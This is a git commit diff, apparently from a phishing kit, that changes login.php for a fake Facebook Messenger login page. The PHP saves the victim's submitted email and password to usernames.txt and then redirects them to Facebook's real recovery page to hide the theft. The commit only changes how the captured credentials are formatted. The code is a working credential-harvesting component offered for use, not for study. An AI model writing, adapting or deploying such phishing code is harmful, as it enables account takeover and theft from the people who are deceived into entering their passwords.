f47b66843ac041f5ffd14db5a9812f11965c60a0
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 18:36:57 +0600

    Update login.php

--- websites/fb_messenger/login.php
+++ websites/fb_messenger/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Facebook :- username : " . $_POST['email'] . "  || Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://www.facebook.com/recover/initiate/');
 exit();
